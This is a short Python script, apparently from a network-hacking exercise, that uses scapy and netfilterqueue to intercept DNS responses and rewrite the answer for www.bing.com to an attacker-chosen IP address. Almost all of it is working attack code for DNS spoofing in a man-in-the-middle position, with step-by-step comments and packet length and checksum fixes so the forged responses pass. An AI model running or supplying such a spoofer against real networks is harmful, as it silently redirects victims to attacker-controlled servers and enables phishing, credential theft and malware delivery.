#!usr/bin/env python

import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    # Convert packet payload to a Scapy packet object
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet has a DNS response layer
    if scapy_packet.haslayer(scapy.DNSRR):  # DNSRR = DNS response
        # Extract the DNS query name from the packet
        qname = scapy_packet[scapy.DNSQR].qname

        # Check if the DNS query is for "www.bing.com"
        if "www.bing.com" in qname.decode():  # Modified to use bytes instead of string
            print("[+] Spoofing target")

            # Create a DNS response with the spoofed IP address
            answer = scapy.DNSRR(rrname=qname, rdata="IP of spoofer")

            # Modify the DNS packet to include the spoofed response
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1  # Set the answer count to 1

            # Delete the length and checksum fields to ensure they are recalculated correctly
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Convert the modified Scapy packet back to bytes and set it as the new payload
            packet.set_payload(bytes(scapy_packet))

    # Accept the modified packet to forward it
    packet.accept()


# Create a NetfilterQueue object and bind it to queue 0 with the process_packet callback
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

# Run the queue to start capturing and processing packets
queue.run()

